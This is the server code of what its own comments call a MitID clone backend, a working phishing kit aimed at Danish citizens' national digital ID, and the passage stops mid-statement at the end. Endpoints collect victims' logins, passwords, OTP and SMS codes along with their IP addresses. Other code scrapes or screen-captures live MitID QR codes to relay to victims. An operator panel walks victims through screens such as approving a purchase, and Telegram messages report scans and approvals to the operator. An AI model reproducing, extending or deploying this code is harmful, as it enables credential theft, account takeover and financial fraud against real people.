require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');
const { Jimp } = require('jimp');
const jsQR = require('jsqr');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*', methods: ['GET', 'POST'] } });

const DATA_FILE = path.join(__dirname, 'data.json');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'skift-mig';
const PORT = process.env.PORT || 3000;

// --- cPanel/Passenger kan kÃ¸re app'en i flere processer, og hver proces har
// sin egen kopi af `state` i hukommelsen. data.json er det fÃ¦lles
// udgangspunkt, sÃ¥ vi husker filens mtime og genindlÃ¦ser nÃ¥r en anden proces
// har skrevet til den. ---
let stateMtime = null;
function stateMtimeNow() {
  try { return fs.statSync(DATA_FILE).mtimeMs; } catch (e) { return null; }
}

function defaultState() {
  return {
    live: false,
    // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend kÃ¸b osv.) -> 'wait' -> 'approved'
    flow: 'brugerid',
    typed: { brugerId: '', cpr: '' },
    beskedBanner: { visible: false, text: '' },
    action: { title: 'Godkend dette kÃ¸b', amount: '', detail: '' },
    tekst: '',
    target: '',
    title: '',
    message: '',
    sessionId: genId(),
    lastUpdated: null,
    bg: 'mint',
    offlineTitle: 'Ingen aktiv session',
    offlineBody: 'Kom tilbage senere',
    customers: [],
    templates: [],
    stats: { totalScans: 0, scanLog: [] },
    schedule: { enabled: false, start: null, end: null },
          capture: { sourceUrl: '', enabled: false, lastCheckedAt: null, lastError: null },
        rotate: { enabled: false, intervalSeconds: 15, lastRotatedAt: null },
        telegram: { enabled: false, token: '', chatId: '', lastError: null, lastSentAt: null, sentCount: 0 }
  };
}

function genId() {
  return 'S-' + Math.random().toString(36).slice(2, 7).toUpperCase();
}
function genTemplateId() {
  return 'T-' + Math.random().toString(36).slice(2, 8).toUpperCase();
}

function loadState() {
  let raw;
  try {
    raw = fs.readFileSync(DATA_FILE, 'utf8');
  } catch (e) {
    // filen findes ikke (foerste start) -> opret frisk default og gem
    const fresh = defaultState();
    saveState(fresh);
    return fresh;
  }
  try {
    // strip eventuel UTF-8 BOM, ellers fejler JSON.parse
    const loaded = JSON.parse(raw.replace(/^\uFEFF/, ''));
    // merge with defaults so upgrades from older data.json don't crash on missing fields
    return { ...defaultState(), ...loaded, stats: { ...defaultState().stats, ...(loaded.stats || {}) }, schedule: { ...defaultState().schedule, ...(loaded.schedule || {}) }, capture: { ...defaultState().capture, ...(loaded.capture || {}) }, rotate: { ...defaultState().rotate, ...(loaded.rotate || {}) } };
  } catch (e) {
    // ugyldig data.json: behold filen som den er (backup sker ikke her, men
    // vi OVERSKRIVER den ikke med defaults -- det ville slette al data)
    console.error('data.json kunne ikke laeses - bruger defaults i hukommelsen, filen rÃ¸res ikke:', e.message);
    return defaultState();
  }
}

function saveState(state) {
  // STÃ†RK BACKEND: atomisk skrivning â€” skriv til temp-fil og omdÃ¸b.
  // StrÃ¸mmer/afbrydelser kan ikke efterlade en halv data.json.
  try {
    const tmp = DATA_FILE + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
    fs.renameSync(tmp, DATA_FILE);
    stateMtime = stateMtimeNow();
  } catch (e) {
    console.error('data.json kunne ikke skrives (beholder gamle data):', e.message);
  }
}

let state = loadState();
stateMtime = stateMtimeNow();

// --- GenindlÃ¦s fra disk fÃ¸r hvert HTTP-request, sÃ¥ Ã¦ndringer skrevet af andre
// processer altid er synlige (Passenger/cPanel multi-proces). ---
function refreshStateFromDisk() {
  try {
    const m = fs.statSync(DATA_FILE).mtimeMs;
    if (m !== stateMtime) {
      stateMtime = m;
      state = loadState();
    }
  } catch (e) { /* data.json findes ikke endnu */ }
}
app.use((req, res, next) => { refreshStateFromDisk(); next(); });

// CORS: admin/visitor kan hostes på andre domæner (fx thedevsadminpanel.com)
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.set('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
app.use(express.json());

// --- No-cache guard for the public display: this is what a kiosk screen sits
// on for hours/days. Without this, browsers and Render's CDN can serve a
// stale display.html/display.js/styles.css, which looks exactly like "the
// screen doesn't update when a customer scans" even though the server side
// is working correctly. ---
app.use('/display', (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});
app.get(['/display.js', '/styles.css'], (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  next();
});

app.use('/display', express.static(path.join(__dirname, 'public'), { index: 'display.html', etag: false, lastModified: false }));
// Admin-panelet: /admin og /admin/panel-d8x3q -> den originale admin-klon (visitor-app-mappen)
app.get(['/admin/panel-d8x3q', '/admin/panel-d8x3q/'], (req, res) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.sendFile(path.join(__dirname, 'public', 'visitor-app', 'panel-d8x3q', 'index.html'));
});
// Kundesiden paa roden (/) og /login â€” kunden skal ikke skulle huske "/display"
// Kundesiden: BARE domÃ¦net (ingen sti) -> visitor.html direkte.
// /display virker stadig som alias. /login ogsaa.
// Kundesiden (visitor â€” MitID-login): / redirectes til /visitor/ (relative assets),
// /visitor/ serves mappen statisk. /login er alias for /visitor/.
app.get('/', (req, res) => res.redirect(302, '/visitor/'));
app.get('/login', (req, res) => res.redirect(302, '/visitor/'));
app.use('/visitor', express.static(path.join(__dirname, 'public', 'visitor'), { index: 'index.html', etag: false, lastModified: false }));
app.get(['/capture', '/capture.js'], (req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    next();
});
app.use('/capture', express.static(path.join(__dirname, 'public'), { index: 'capture.html', etag: false, lastModified: false }));
app.use('/admin', (req, res, next) => {
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  next();
});
app.use('/admin', express.static(path.join(__dirname, 'public', 'visitor-app'), { index: 'index.html', etag: false, lastModified: false }));
app.use(express.static(path.join(__dirname, 'public'), { etag: false, lastModified: false }));

// --- Public: read-only state for the display screen (no auth, no secrets in payload) ---
app.get('/api/public-state', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  res.json(publicPayload());
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MITID KLON-BACKEND â€” delte /api/public/* endpoints som bÃ¥de
// admin-panelet og visitor-siden bruger (via mock-api broen).
// Admin-panelers toggles skriver her; visitor-siden poller.
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const mitidState = {
  settings: {
    'show-sms': true,
    'show-otp': true,
    'show-password': true,
    'show-swipe': false,
    'sms-amount': '500 DKK',
    'otp-code': '123456',
    'connection-text': 'Forbinder sikkert',
    'broadcast-message': '',
    'broadcast-type': 'info',
    'redirect-url': '',
  },
  currentQr: 'https://mitid.dk/demo-login-' + Math.random().toString(36).slice(2, 8),
  logs: {
    'user-logins': [],
    'otp-entered': [],
    'password-entered': [],
    'sms-codes': [],
  },
};

// Response-shapes som visitor-app'en forventer (afkodet fra main-B2wHLd3B.js)
const SETTINGS_RESPONSES = {
  'show-sms': (v) => ({ showSmsField: v === true || v === 'true' }),
  'show-otp': (v) => ({ showOtpField: v === true || v === 'true' }),
  'show-password': (v) => ({ showPasswordField: v === true || v === 'true' }),
  'show-swipe': (v) => ({ showSwipe: v === true || v === 'true' }),
  'sms-amount': (v) => ({ smsAmount: String(v) }),
  'otp-code': (v) => ({ otpCode: String(v) }),
  'connection-text': (v) => ({ connectionText: String(v) }),
  'broadcast-message': (v) => ({ message: v || null }),
  'broadcast-type': (v) => ({ type: String(v || 'info') }),
  'redirect-url': (v) => ({ redirectUrl: String(v || '') }),
};

app.get('/api/public/settings/:key', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  const key = req.params.key;
  if (SETTINGS_RESPONSES[key]) return res.json(SETTINGS_RESPONSES[key](mitidState.settings[key]));
  res.json({});
});

app.post('/api/public/settings/:key', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  const key = req.params.key;
  if (!SETTINGS_RESPONSES[key]) return res.status(400).json({ error: 'unknown setting' });
  // Accepter flere body-former: {value}, {showSmsField}, {redirectUrl}, rÃ¥ vÃ¦rdi
  const b = req.body || {};
  let val;
  if (b.value !== undefined) val = b.value;
  else {
    const props = Object.keys(b);
    if (props.length === 1) val = b[props[0]];
  }
  if (val === undefined) val = b;
  mitidState.settings[key] = val;
  io.emit('mitid-settings', { key, value: val });
  res.json(SETTINGS_RESPONSES[key](val));
});

app.get('/api/public/current-qr', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  res.json({ qrData: mitidState.currentQr, valid: true, expiresAt: Date.now() + 60000 });
});

app.post('/api/public/current-qr', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  const b = req.body || {};
  mitidState.currentQr = b.qrData !== undefined ? b.qrData : (b.qr !== undefined ? b.qr : (b.value !== undefined ? b.value : null));
  io.emit('mitid-qr', mitidState.currentQr);
  res.json({ success: true, qrData: mitidState.currentQr });
});

// Victim-input opsamles her (admin-panelet poller disse lister)
;['user-logins', 'otp-entered', 'password-entered', 'sms-codes'].forEach((ep) => {
  app.post('/api/public/' + ep, (req, res) => {
    res.set('Cache-Control', 'no-store');
    res.set('Access-Control-Allow-Origin', '*');
    const b = req.body || {};
    const row = {
      id: 'row-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6),
      ...b,
      time: Date.now(),
      ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '',
      userAgent: req.headers['user-agent'] || '',
    };
    mitidState.logs[ep].push(row);
    if (mitidState.logs[ep].length > 200) mitidState.logs[ep] = mitidState.logs[ep].slice(-200);
    io.emit('mitid-log', { endpoint: ep, row });
    res.json({ success: true, received: true });
  });
  app.get('/api/public/' + ep, (req, res) => {
    res.set('Cache-Control', 'no-store');
    res.set('Access-Control-Allow-Origin', '*');
    res.json(mitidState.logs[ep]);
  });
});

// Admin-panelets egne endpoints (krÃ¦ves af admin-klonen via broen)
app.post('/api/public/admin-verify', (req, res) => {
  res.set('Access-Control-Allow-Origin', '*');
  res.json({ success: true, valid: true, token: 'local-' + Date.now() });
});

app.get('/api/admin/visitor-logs', (req, res) => {
  res.set('Cache-Control', 'no-store');
  res.set('Access-Control-Allow-Origin', '*');
  const all = [];
  for (const [ep, rows] of Object.entries(mitidState.logs)) {
    rows.forEach((r) => all.push({ ...r, type: ep }));
  }
  all.sort((a, b) => (b.time || 0) - (a.time || 0));
  res.json(all.slice(0, 100));
});

// --- Public: scan-tracking redirect. QR codes point here instead of straight to the target,
// so every real scan gets counted before the customer is sent on to the actual link. ---
app.get('/r/:sessionId', (req, res) => {
  if (state.live && state.target) {
    state.stats.totalScans += 1;
    state.stats.scanLog.push({ at: Date.now(), session: req.params.sessionId });
    if (state.stats.scanLog.length > 200) {
      state.stats.scanLog = state.stats.scanLog.slice(-200);
    }
    saveState(state);
    io.emit('admin-state-update', safeAdminState());
    // Telegram: notificÃ©r admin om scanningen (med kundens IP)
    telegramSend(`ðŸ“² QR scannet (session ${req.params.sessionId})\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'ukendt'}\nKlokken: ${new Date().toLocaleString('da-DK')}`).catch(() => {});
    return res.redirect(302, state.target);
  }
  res.status(404).send(`
    <!DOCTYPE html><html lang="da"><head><meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>regningoutbounn</title>
    <style>body{font-family:sans-serif;background:#132E28;color:#DCF2E8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px;}</style>
    </head><body><div><h1>Ingen aktiv session</h1><p>Dette link er ikke aktivt lige nu.</p></div></body></html>
  `);
});

// --- Admin auth middleware ---
function requireAdmin(req, res, next) {
  const auth = req.headers['x-admin-password'];
  if (auth !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'Forkert adgangskode' });
  }
  next();
}

async function resolveQrImageBuffer(url) {
    const r = await fetch(url, { redirect: 'follow' });
    if (!r.ok) throw new Error(`Kunne ikke hente siden (HTTP ${r.status})`);
    const ct = r.headers.get('content-type') || '';
    if (ct.startsWith('image/')) {
          return Buffer.from(await r.arrayBuffer());
    }
    const html = await r.text();
    const imgMatches = [...html.matchAll(/<img[^>]+src=["']([^"']+)["'][^>]*>/gi)];
    if (!imgMatches.length) throw new Error('Ingen billeder fundet paa siden');
    const qrCandidate = imgMatches.find(m => /qr/i.test(m[0]));
    const candidate = qrCandidate || imgMatches[0];
    let imgSrc = candidate[1];
    if (imgSrc.startsWith('//')) {
          imgSrc = 'https:' + imgSrc;
    } else if (!/^https?:\/\//i.test(imgSrc)) {
          imgSrc = new URL(imgSrc, url).toString();
    }
    const r2 = await fetch(imgSrc, { redirect: 'follow' });
    if (!r2.ok) throw new Error(`Kunne ikke hente billedet (HTTP ${r2.status})`);
    return Buffer.from(await r2.arrayBuffer());
}

async function decodeQrFromBuffer(buffer) {
    const image = await Jimp.read(buffer);
    const { data, width, height } = image.bitmap;
    const code = jsQR(new Uint8ClampedArray(data), width, height);
    return code ? code.data : null;
}

app.post('/api/capture-url', requireAdmin, async (req, res) => {
    const { url } = req.body;
    if (!url || typeof url !== 'string' || !url.trim()) {
          return res.status(400).json({ error: 'Ingen URL angivet' });
    }
    const cleanUrl = url.trim();
    try {
          const buffer = await resolveQrImageBuffer(cleanUrl);
          const decoded = await decodeQrFromBuffer(buffer);
          state.capture.lastCheckedAt = Date.now();
          if (!decoded) {
                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
                  saveState(state);
                  return res.status(422).json({ error: state.capture.lastError });
          }
          state.capture.lastError = null;
          if (state.target !== decoded || !state.live) {
                  state.target = decoded;
                  state.live = true;
                  state.lastUpdated = Date.now();
                  io.emit('state-update', publicPayload());
          }
          saveState(state);
          io.emit('admin-state-update', safeAdminState());
          res.json({ ok: true, target: decoded });
    } catch (e) {
          state.capture.lastError = e.message || 'Ukendt fejl';
          state.capture.lastCheckedAt = Date.now();
          saveState(state);
          io.emit('admin-state-update', safeAdminState());
          res.status(500).json({ error: state.capture.lastError });
    }
});

app.post('/api/capture-settings', requireAdmin, (req, res) => {
    const { sourceUrl, enabled } = req.body;
    if (sourceUrl !== undefined) state.capture.sourceUrl = String(sourceUrl).trim();
    if (enabled !== undefined) state.capture.enabled = !!enabled;
    saveState(state);
    io.emit('admin-state-update', safeAdminState());
    res.json(state.capture);
});

// Push a value read live from the admin's own screen (screen-capture flow):
// no server-side fetch/decoding needed here, the browser already decoded it.
app.post('/api/capture-push', requireAdmin, (req, res) => {
    const { target } = req.body;
    if (!target || typeof target !== 'string' || !target.trim()) {
          return res.status(400).json({ error: 'Tom kode' });
    }
    const clean = target.trim();
    const changed = (state.target !== clean || !state.live);
    state.capture.lastCheckedAt = Date.now();
    state.capture.lastError = null;
    if (changed) {
          state.target = clean;
          state.live = true;
          state.lastUpdated = Date.now();
    }
    // HURTIGHED: ack straks, kundesiden opdateres via socket i samme tick,
    // disk-skrivning + Telegram sker asynkront bagefter (blokerer ikke push)
    res.json({ ok: true, target: clean, live: state.live });
    if (changed) {
          io.emit('state-update', publicPayload());
          telegramSend(`ðŸŽ¯ QR-mÃ¥l opdateret via skÃ¦rmdeling:\n${clean.slice(0, 100)}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
    }
    io.emit('admin-state-update', safeAdminState());
    saveState(state);
});

setInterval(async () => {
    refreshStateFromDisk();
    if (!state.capture || !state.capture.enabled || !state.capture.sourceUrl) return;
    try {
          const buffer = await resolveQrImageBuffer(state.capture.sourceUrl);
          const decoded = await decodeQrFromBuffer(buffer);
          state.capture.lastCheckedAt = Date.now();
          if (!decoded) {
                  state.capture.lastError = 'Kunne ikke finde eller aflaese en QR-kode paa siden';
                  saveState(state);
                  io.emit('admin-state-update', safeAdminState());
                  return;
          }
          state.capture.lastError = null;
          if (state.target !== decoded || !state.live) {
                  state.target = decoded;
                  state.live = true;
                  state.lastUpdated = Date.now();
                  saveState(state);
                  io.emit('state-update', publicPayload());
                  io.emit('admin-state-update', safeAdminState());
          } else {
                  saveState(state);
          }
    } catch (e) {
          state.capture.lastError = e.message || 'Ukendt fejl';
          state.capture.lastCheckedAt = Date.now();
          saveState(state);
          io.emit('admin-state-update', safeAdminState());
    }
}, 20000);

// --- Login med Telegram-2FA ---
// Trin 1: korrekt adgangskode -> generÃ©r 6-cifret kode, send til Telegram-bot,
//         og krav koden fÃ¸r adgang gives (fald tilbage til kun adgangskode hvis
//         Telegram ikke er konfigureret).
const crypto = require('crypto');

app.post('/api/login', (req, res) => {
  const ip = clientIp(req);
  if (loginRateLimited(ip)) {
    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” prÃ¸v igen om fÃ¥ minutter' });
  }
  const { password } = req.body;
  if (password !== ADMIN_PASSWORD) {
    loginRateCount(ip);
    return res.status(401).json({ ok: false });
  }
  loginRateReset(ip);
  // er Telegram klar?
  const tg = state.telegram || {};
  const tgReady = !!((tg.token) || process.env.TELEGRAM_BOT_TOKEN) && !!((tg.chatId) || process.env.TELEGRAM_CHAT_ID);
  if (!tgReady) {
    return res.json({ ok: true, needsCode: false });
  }
  // generÃ©r kode (6 cifre), gyldig 5 min
  const code = String(crypto.randomInt(100000, 999999));
  state.loginCode = { code, expiresAt: Date.now() + 5 * 60 * 1000, attempts: 0 };
  saveState(state);
  telegramSend(`ðŸ” TheDevs Admin Panel\nLogin-kode: ${code}\n(Gyldig i 5 minutter â€” ${
    new Date().toLocaleTimeString('da-DK')})`).catch(() => {});
  res.json({ ok: true, needsCode: true });
});

// Trin 2: verificÃ©r koden fra Telegram
app.post('/api/login/verify', (req, res) => {
  const ip = clientIp(req);
  if (loginRateLimited(ip)) {
    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” prÃ¸v igen om fÃ¥ minutter' });
  }
  const { password, code } = req.body;
  if (password !== ADMIN_PASSWORD) {
    loginRateCount(ip);
    return res.status(401).json({ ok: false, error: 'Forkert adgangskode' });
  }
  const lc = state.loginCode;
  if (!lc || !lc.code) {
    return res.status(400).json({ ok: false, error: 'Ingen kode sendt â€” log ind igen' });
  }
  if (Date.now() > lc.expiresAt) {
    state.loginCode = null;
    saveState(state);
    return res.status(400).json({ ok: false, error: 'Koden er udlÃ¸bet â€” log ind igen' });
  }
  if ((lc.attempts || 0) >= 5) {
    state.loginCode = null;
    saveState(state);
    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” log ind igen' });
  }
  if (String(code || '').trim() !== lc.code) {
    lc.attempts = (lc.attempts || 0) + 1;
    loginRateCount(ip);
    saveState(state);
    return res.status(401).json({ ok: false, error: 'Forkert kode' });
  }
  // korrekt kode â€” ryd den og nulstil rate-limit
  state.loginCode = null;
  loginRateReset(ip);
  saveState(state);
  res.json({ ok: true });
});

// --- Telegram-notifikationer ---
// Token+chatId lever KUN paa serveren: gemmes i data.json men strippes i
// alle API-svar og broadcasts, sÃ¥ de aldrig rammer en browser/klient.
async function telegramSend(text) {
  const t = state.telegram || {};
  const token = (t.token || process.env.TELEGRAM_BOT_TOKEN || '').trim();
  const chatId = (t.chatId || process.env.TELEGRAM_CHAT_ID || '').trim();
  if (!token || !chatId) return;
  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    t.lastError = r.ok ? null : `HTTP ${r.status}`;
    t.lastSentAt = Date.now();
    if (r.ok) t.sentCount = (t.sentCount || 0) + 1;
  } catch (e) {
    t.lastError = e.message || 'NetvÃ¦rksfejl';
  }
}

// state uden hemmeligheder (til /api/state og admin-broadcast)
function safeAdminState() {
  const { telegram, ...rest } = state;
  return {
    ...rest,
    telegram: telegram
      ? { enabled: telegram.enabled, hasToken: !!telegram.token, hasChatId: !!telegram.chatId, lastError: telegram.lastError, lastSentAt: telegram.lastSentAt, sentCount: telegram.sentCount || 0 }
      : { enabled: false }
  };
}

app.post('/api/telegram-settings', requireAdmin, (req, res) => {
  const { enabled, token, chatId } = req.body;
  if (enabled !== undefined) state.telegram.enabled = !!enabled;
  if (token !== undefined) state.telegram.token = String(token).trim();
  if (chatId !== undefined) state.telegram.chatId = String(chatId).trim();
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  res.json(safeAdminState().telegram);
});

app.post('/api/telegram-test', requireAdmin, async (req, res) => {
  state.telegram.lastError = null;
  await telegramSend('âœ… QR-panel: Test-besked â€” Telegram-integrationen virker!');
  saveState(state);
  res.json(safeAdminState().telegram);
});

app.get('/api/state', requireAdmin, (req, res) => {
  res.json(safeAdminState());
});

app.post('/api/state', requireAdmin, (req, res) => {
  const allowed = ['live', 'flow', 'target', 'title', 'message', 'bg', 'offlineTitle', 'offlineBody'];
  allowed.forEach(key => {
    if (req.body[key] !== undefined) state[key] = req.body[key];
  });
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', safeAdminState());
  res.json(safeAdminState());
});

app.post('/api/session/new', requireAdmin, (req, res) => {
  state.sessionId = genId();
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  io.emit('state-update', publicPayload());
  res.json(safeAdminState());
});

// --- Flow: kundens trin pÃ¥ /display â€” 'besked' | 'scan' | 'action' | 'wait' | 'approved' ---
// Styrles fra admin-konsollens kontrol-knapper. 'approved' sender
// Telegram-besked ("Kunde er nu Godkendt!") som i det gamle panel.
app.post('/api/flow', requireAdmin, (req, res) => {
  const flow = req.body.flow;
  if (!['brugerid', 'loader', 'venterqr', 'scan', 'bekrÃ¦ft', 'kodeviser', 'adgangskode', 'sms', 'annullering', 'wait', 'approved'].includes(flow)) {
    return res.status(400).json({ error: 'Ugyldigt flow' });
  }
  state.flow = flow;
  // action-trin: medsend evt. ny tekst/belÃ¸b/detalje
  if (flow === 'betaling' && req.body.action) {
    const a = req.body.action;
    state.action = state.action || {};
    if (a.title  !== undefined) state.action.title  = String(a.title).slice(0, 200);
    if (a.amount !== undefined) state.action.amount = String(a.amount).slice(0, 50);
    if (a.detail !== undefined) state.action.detail = String(a.detail).slice(0, 400);
  }
  state.lastUpdated = Date.now();
  saveState(state);
  // Ã¸jeblikkelig push til kundesiden (socket) + admin
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', safeAdminState());
  if (flow === 'approved') {
    telegramSend('âœ… Kunde er nu Godkendt!').catch(() => {});
  }
  res.json(safeAdminState());
});

// --- Kunden har trykket GODKEND/ANNULLER pÃ¥ action-trinnet ---
app.post('/api/action-response', (req, res) => {
  const r = req.body.response; // 'ok' | 'cancel'
  if (!['ok', 'cancel'].includes(r)) {
    return res.status(400).json({ error: 'Ugyldigt svar' });
  }
  const a = state.action || {};
  const label = r === 'ok' ? 'âœ… GODKENDT' : 'âŒ ANNULLERET';
  const amount = a.amount ? ` â€” ${a.amount}` : '';
  telegramSend(`${label} af kunden\n${a.title || 'Handling'}${amount}\n${a.detail || ''}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
  state.actionResponse = { at: Date.now(), response: r };
  if (r === 'ok') {
    // kunden godkendte -> den klassiske "Forbinder sikkert"-loader
    state.flow = 'wait';
  }
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', safeAdminState());
  res.json({ ok: true });
});

app.post('/api/customers', requireAdmin, (req, res) => {
  const ref = 'K-' + Math.floor(1000 + Math.random() * 9000);
  state.customers.push({
    ref,
    session: state.sessionId,
    started: Date.now(),
    status: 'active'
  });
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  res.json(safeAdminState());
});

// --- Templates: save & reuse a full session setup (title, message, target, bg) ---
app.get('/api/templates', requireAdmin, (req, res) => {
  res.json(state.templates);
});

app.post('/api/templates', requireAdmin, (req, res) => {
  const { name, title, message, target, bg } = req.body;
  if (!name || !name.trim()) {
    return res.status(400).json({ error: 'Skabelonen skal have et navn' });
  }
  const template = {
    id: genTemplateId(),
    name: name.trim(),
    title: title || '',
    message: message || '',
    target: target || '',
    bg: bg || 'mint',
    createdAt: Date.now()
  };
  state.templates.push(template);
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  res.json(template);
});

app.post('/api/templates/:id/apply', requireAdmin, (req, res) => {
  const tpl = state.templates.find(t => t.id === req.params.id);
  if (!tpl) return res.status(404).json({ error: 'Skabelon ikke fundet' });
  state.title = tpl.title;
  state.message = tpl.message;
  state.target = tpl.target;
  state.bg = tpl.bg;
  state.lastUpdated = Date.now();
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', safeAdminState());
  res.json(safeAdminState());
});

app.delete('/api/templates/:id', requireAdmin, (req, res) => {
  state.templates = state.templates.filter(t => t.id !== req.params.id);
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  res.json({ ok: true });
});

// --- Stats ---
app.get('/api/stats', requireAdmin, (req, res) => {
  const dayMs = 24 * 60 * 60 * 1000;
  const now = Date.now();
  const last24h = state.stats.scanLog.filter(s => now - s.at < dayMs).length;
  res.json({
    totalScans: state.stats.totalScans,
    last24h,
    recent: state.stats.scanLog.slice(-15).reverse()
  });
});

// --- Scheduling: auto go live/offline within a time window, checked every 30s ---
app.post('/api/schedule', requireAdmin, (req, res) => {
  const { enabled, start, end } = req.body;
  state.schedule = {
    enabled: !!enabled,
    start: start || null,
    end: end || null
  };
  saveState(state);
  io.emit('admin-state-update', safeAdminState());
  res.json(state.schedule);
});

setInterval(() => {
  refreshStateFromDisk();
  if (!state.schedule || !state.schedule.enabled || !state.schedule.start || !state.schedule.end) return;
  const now = Date.now();
  const start = new Date(state.schedule.start).getTime();
  const end = new Date(state.schedule.end).getTime();
  if (isNaN(start) || isNaN(end)) return;
  const shouldBeLive = now >= start && now <= end;
  if (shouldBeLive !== state.live) {
    state.live = shouldBeLive;
    state.lastUpdated = Date.now();
    saveState(state);
    io.emit('state-update', publicPayload());
    io.emit('admin-state-update', safeAdminState());
  }
}, 30000);

function publicPayload() {
  const a = state.action || {};
  return {
    live: state.live,
    flow: state.flow || 'scan',
    target: state.target,
    sessionId: state.sessionId,
    title: state.title,
    message: state.message,
    action: { title: a.title || 'Godkend dette kÃ¸b', amount: a.amount || '', detail: a.detail || '' },
    tekst: state.tekst || '',
    typed: state.typed || { brugerId: '', cpr: '' },
    beskedBanner: state.beskedBanner || { visible: false, text: '' },
    annulerer: state.flow === 'annuller',
    offlineTitle: state.offlineTitle,
    offlineBody: state.offlineBody
  };
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STÃ†RK BACKEND â€” robusthed sÃ¥ app'en ikke gÃ¥r ned:
// 1) Ingen route-fejl kan crashe processen
// 2) Rate-limit pÃ¥ login (brute-force-beskyttelse)
// 3) Ufangede promise-fejl logges i stedet for at drÃ¦be processen
// 4) Disk-fejl under skrivning mister aldrig data i hukommelsen
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// global fejlhÃ¥ndtering: log og koer videre
process.on('uncaughtException', (err) => {
  console.error('[crash-guard] uncaughtException:', err.message, err.stack ? err.stack.split('\n')[1] : '');
});
process.on('unhandledRejection', (reason) => {
  console.error('[crash-guard] unhandledRejection:', reason && reason.message ? reason.message : reason);
});

// rate-limit: login (og 2FA-verificering) â€” max 10 forsÃ¸g pr. 10 min pr. IP
const loginAttempts = new Map(); // ip -> { count, firstAt }
const LOGIN_WINDOW_MS = 10 * 60 * 1000;
const LOGIN_MAX = 10;

function loginRateLimited(ip) {
  const now = Date.now();
  let a = loginAttempts.get(ip);
  if (!a || now - a.firstAt > LOGIN_WINDOW_MS) {
    a = { count: 0, firstAt: now };
    loginAttempts.set(ip, a);
  }
  return a.count >= LOGIN_MAX;
}
function loginRateCount(ip) {
  const a = loginAttempts.get(ip);
  if (a) a.count += 1;
}
function loginRateReset(ip) {
  loginAttempts.delete(ip);
}

function clientIp(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || '?';
}

io.on('connection', (socket) => {
  socket.emit('state-update', publicPayload());
});

// Pas pÃ¥: pÃ¥ cPanel/Passenger skal denne app IKKE lÃ¦gge om til et fast portnr
// eller '0.0.0.0' â€” Passenger selv styrer forbindelsen, og listen-kaldet her
// fungerer som det er (PORT bruges kun ved lokal test).
server.listen(PORT, () => {
